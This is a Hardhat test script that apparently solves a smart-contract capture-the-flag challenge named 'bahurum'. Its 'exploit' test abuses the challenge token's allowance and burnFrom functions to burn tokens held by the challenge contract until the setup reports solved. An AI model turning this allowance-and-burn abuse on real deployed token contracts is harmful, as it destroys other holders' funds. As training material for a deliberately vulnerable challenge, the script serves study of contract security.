import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_bahurum, CHALLENGE_bahurum} from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let setup: Contract; 
let challenge: Contract;
let token: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    setup = (await ethers.getContractAt(`contracts/bahurum/Setup.sol:Setup`, SETUP_bahurum)).connect(attacker);
    challenge = await ethers.getContractAt(`contracts/bahurum/Inflation.sol:Inflation`, setup.instance());
    token = await ethers.getContractAt(`contracts/bahurum/Inflation.sol:InflationaryToken`, challenge.token());
});

it("prints contract address", async function () {
    const addr = await challenge.address;
    expect(addr).to.eq(CHALLENGE_bahurum);
});

it("info", async function () {
    console.log((await token.rate()).toString());
    console.log((await token.balanceOf(challenge.address)).toString());
});

it("exploit", async () => {
    console.log((await token.totalSupply()).toString());
    await token.increaseAllowance(challenge.address, 5000);
    await token.burnFrom(challenge.address, 1100);
    console.log((await token.balanceOf(challenge.address)).toString());
    // exploit = await (await ethers.getContractFactory(`contracts/0xmoostorm/Exploit.sol:Exploit`, attacker)).deploy(exchange.address);
    expect(await setup.isSolved()).to.eq(true);
});